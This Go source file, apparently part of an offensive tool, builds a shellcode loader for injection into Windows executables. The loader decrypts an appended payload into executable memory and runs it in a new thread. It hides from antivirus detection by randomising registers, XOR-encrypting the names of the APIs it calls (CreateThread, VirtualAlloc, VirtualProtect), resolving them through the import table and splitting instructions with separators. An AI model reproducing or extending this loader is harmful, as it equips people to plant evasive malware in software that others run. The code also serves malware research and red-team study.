package injector

import (
	"bytes"
	"embed"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
	"text/template"

	"github.com/For-ACGN/go-keystone"
)

// just for prevent [import _ "embed"] :)
var _ embed.FS

// The role of the shellcode loader is used to decrypt shellcode
// in the tail section to a new RWX page, then create thread at
// the decrypted shellcode.
var (
	//go:embed loader/loader_x86.asm
	defaultLoaderX86 string

	//go:embed loader/loader_x64.asm
	defaultLoaderX64 string
)

var (
	registerX86 = []string{
		"eax", "ebx", "ecx", "edx",
		"ebp", "edi", "esi",
	}

	regVolatileX86 = []string{
		"eax", "ecx", "edx",
	}

	regNonvolatileX86 = []string{
		"ebx", "ebp", "edi", "esi",
	}

	registerX64 = []string{
		"rax", "rbx", "rcx", "rdx",
		"rbp", "rdi", "rsi",
		"r8", "r9", "r10", "r11",
		"r12", "r13", "r14", "r15",
	}

	regVolatileX64 = []string{
		"rax", "rcx", "rdx",
		"r8", "r9", "r10", "r11",
	}

	regNonvolatileX64 = []string{
		"rbx", "rbp", "rdi", "rsi",
		"r12", "r13", "r14", "r15",
	}
)

var (
	separator = []byte{0x8F, 0x17, 0x97, 0x3C} // split each instruction
)

type loaderCtx struct {
	// for replace registers
	Reg  map[string]string
	RegV map[string]string
	RegN map[string]string

	// store procedure status
	LackProcedure      bool
	LackCreateThread   bool
	LackVirtualAlloc   bool
	LackVirtualProtect bool
	LoadLibraryWOnly   bool

	// encrypt procedure name with xor
	Kernel32DLLDB     []int64
	Kernel32DLLKey    []int64
	CreateThreadDB    []int64
	CreateThreadKey   []int64
	VirtualAllocDB    []int64
	VirtualAllocKey   []int64
	VirtualProtectDB  []int64
	VirtualProtectKey []int64

	// store procedure IAT offset
	LoadLibrary    uint64
	GetProcAddress uint64
	CreateThread   uint64
	VirtualAlloc   uint64
	VirtualProtect uint64
}

func (inj *Injector) buildLoader() ([]byte, error) {
	// initialize keystone engine
	err := inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	defer func() {
		_ = inj.engine.Close()
		inj.engine = nil
	}()
	// create assembly source
	var src string
	switch inj.arch {
	case "386":
		src = inj.getLoaderX86()
	case "amd64":
		src = inj.getLoaderX64()
	}
	tpl, err := template.New("loader").Funcs(template.FuncMap{
		"db":  toDB,
		"hex": toHex,
		"dr":  toRegDWORD,
		"is":  insertSeparator,
	}).Parse(src)
	if err != nil {
		return nil, fmt.Errorf("invalid assembly source template: %s", err)
	}
	ctx := &loaderCtx{
		Reg:  inj.buildRandomRegisterMap(),
		RegV: inj.buildVolatileRegisterMap(),
		RegN: inj.buildNonvolatileRegisterMap(),
	}
	err = inj.findProcFromIAT(ctx)
	if err != nil {
		return nil, err
	}
	inj.encryptStrings(ctx)
	// process loader template and assemble it
	buf := bytes.NewBuffer(make([]byte, 0, 512))
	err = tpl.Execute(buf, ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to build assembly source: %s", err)
	}
	fmt.Println(buf.String())
	inst, err := inj.assemble(buf.String())
	inst = bytes.ReplaceAll(inst, separator, nil)
	os.WriteFile("testdata/loader.exe", inst, 0600)
	return inst, err
}

func (inj *Injector) initAssembler() error {
	var err error
	switch inj.arch {
	case "386":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_32)
	case "amd64":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_64)
	}
	if err != nil {
		return err
	}
	return inj.engine.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
}

func (inj *Injector) getLoaderX86() string {
	if inj.opts.LoaderX86 != "" {
		return inj.opts.LoaderX86
	}
	return defaultLoaderX86
}

func (inj *Injector) getLoaderX64() string {
	if inj.opts.LoaderX64 != "" {
		return inj.opts.LoaderX64
	}
	return defaultLoaderX64
}

func (inj *Injector) assemble(src string) ([]byte, error) {
	if strings.Contains(src, "<no value>") {
		return nil, errors.New("invalid register in assembly source")
	}
	return inj.engine.Assemble(src, 0)
}

func (inj *Injector) buildRandomRegisterMap() map[string]string {
	var reg []string
	switch inj.arch {
	case "386":
		reg = make([]string, len(registerX86))
		copy(reg, registerX86)
	case "amd64":
		reg = make([]string, len(registerX64))
		copy(reg, registerX64)
	}
	inj.regBox = reg
	register := make(map[string]string, len(reg))
	switch inj.arch {
	case "386":
		for _, reg := range registerX86 {
			register[reg] = inj.selectRegister()
		}
	case "amd64":
		for _, reg := range registerX64 {
			register[reg] = inj.selectRegister()
		}
	}
	return register
}

func (inj *Injector) buildVolatileRegisterMap() map[string]string {
	var reg []string
	switch inj.arch {
	case "386":
		reg = make([]string, len(regVolatileX86))
		copy(reg, regVolatileX86)
	case "amd64":
		reg = make([]string, len(regVolatileX64))
		copy(reg, regVolatileX64)
	}
	inj.regBox = reg
	register := make(map[string]string, len(reg))
	switch inj.arch {
	case "386":
		for _, reg := range regVolatileX86 {
			register[reg] = inj.selectRegister()
		}
	case "amd64":
		for _, reg := range regVolatileX64 {
			register[reg] = inj.selectRegister()
		}
	}
	return register
}

func (inj *Injector) buildNonvolatileRegisterMap() map[string]string {
	var reg []string
	switch inj.arch {
	case "386":
		reg = make([]string, len(regNonvolatileX86))
		copy(reg, regNonvolatileX86)
	case "amd64":
		reg = make([]string, len(regNonvolatileX64))
		copy(reg, regNonvolatileX64)
	}
	inj.regBox = reg
	register := make(map[string]string, len(reg))
	switch inj.arch {
	case "386":
		for _, reg := range regNonvolatileX86 {
			register[reg] = inj.selectRegister()
		}
	case "amd64":
		for _, reg := range regNonvolatileX64 {
			register[reg] = inj.selectRegister()
		}
	}
	return register
}

// selectRegister is used to make sure each register will be selected once.
func (inj *Injector) selectRegister() string {
	idx := inj.rand.Intn(len(inj.regBox))
	reg := inj.regBox[idx]
	// remove selected register
	inj.regBox = append(inj.regBox[:idx], inj.regBox[idx+1:]...)
	return reg
}

func (inj *Injector) findProcFromIAT(ctx *loaderCtx) error {
	CreateThread := inj.getProcFromIAT("CreateThread")
	VirtualAlloc := inj.getProcFromIAT("VirtualAlloc")
	VirtualProtect := inj.getProcFromIAT("VirtualProtect")
	var lackProcedure bool
	if CreateThread != nil {
		ctx.CreateThread = CreateThread.addr
	} else {
		ctx.LackCreateThread = true
		lackProcedure = true
	}
	if VirtualAlloc != nil {
		ctx.VirtualAlloc = VirtualAlloc.addr
	} else {
		ctx.LackVirtualAlloc = true
		lackProcedure = true
	}
	if VirtualProtect != nil {
		ctx.VirtualProtect = VirtualProtect.addr
	} else {
		ctx.LackVirtualProtect = true
		lackProcedure = true
	}
	ctx.LackProcedure = lackProcedure
	if !lackProcedure {
		return nil
	}
	LoadLibraryA := inj.getProcFromIAT("LoadLibraryA")
	LoadLibraryW := inj.getProcFromIAT("LoadLibraryW")
	GetProcAddress := inj.getProcFromIAT("GetProcAddress")
	if LoadLibraryA == nil && LoadLibraryW == nil {
		return errors.New("proc LoadLibrary is not exist in IAT")
	}
	if GetProcAddress == nil {
		return errors.New("proc GetProcAddress is not exist in IAT")
	}
	if LoadLibraryA != nil {
		ctx.LoadLibrary = LoadLibraryA.addr
	} else {
		ctx.LoadLibrary = LoadLibraryW.addr
		ctx.LoadLibraryWOnly = true
	}
	ctx.GetProcAddress = GetProcAddress.addr
	return nil
}

func (inj *Injector) getProcFromIAT(proc string) *iat {
	for _, iat := range inj.iat {
		if iat.proc == proc {
			return iat
		}
	}
	return nil
}

func (inj *Injector) encryptStrings(ctx *loaderCtx) {
	isUTF16 := ctx.LoadLibraryWOnly
	ctx.Kernel32DLLDB, ctx.Kernel32DLLKey = inj.encryptString("kernel32.dll", isUTF16)
	ctx.CreateThreadDB, ctx.CreateThreadKey = inj.encryptString("CreateThread", false)
	ctx.VirtualAllocDB, ctx.VirtualAllocKey = inj.encryptString("VirtualAlloc", false)
	ctx.VirtualProtectDB, ctx.VirtualProtectKey = inj.encryptString("VirtualProtect", false)
}

func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) {
	str += "\x00"
	if isUTF16 {
		str = toUTF16(str)
	}
	var (
		val []int64
		key []int64
	)
	switch inj.arch {
	case "386":
		// process alignment
		num := len(str) % 4
		if num != 0 {
			num = 4 - num
		}
		str += strings.Repeat("\x00", num)
		for i := len(str) - 4; i >= 0; i -= 4 {
			v := binary.LittleEndian.Uint32([]byte(str[i:]))
			k := inj.rand.Uint32()
			val = append(val, int64(v^k))
			key = append(key, int64(k))
		}
	case "amd64":
		// process alignment
		num := len(str) % 8
		if num != 0 {
			num = 8 - num
		}
		str += strings.Repeat("\x00", num)
		for i := len(str) - 8; i >= 0; i -= 8 {
			v := int64(binary.LittleEndian.Uint64([]byte(str[i:]))) // #nosec G115
			k := inj.rand.Int63()
			val = append(val, v^k)
			key = append(key, k)
		}
	}
	return val, key
}

func toUTF16(s string) string {
	u := strings.Builder{}
	u.Grow(len(s) * 2)
	for _, r := range s {
		u.WriteRune(r)
		u.WriteByte(0x00)
	}
	return u.String()
}

func toDB(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	builder := strings.Builder{}
	builder.WriteString(".byte ")
	for i := 0; i < len(b); i++ {
		builder.WriteString("0x")
		s := hex.EncodeToString([]byte{b[i]})
		builder.WriteString(strings.ToUpper(s))
		builder.WriteString(", ")
	}
	return builder.String()
}

func toHex(v any) string {
	return fmt.Sprintf("0x%X", v)
}

// convert r8 -> r8d, rax -> eax
func toRegDWORD(reg string) string {
	_, err := strconv.Atoi(reg[1:])
	if err == nil {
		return reg + "d"
	}
	return strings.ReplaceAll(reg, "r", "e")
}

// for split each instruction
func insertSeparator() string {
	return ";" + toDB(separator) + ";"
}
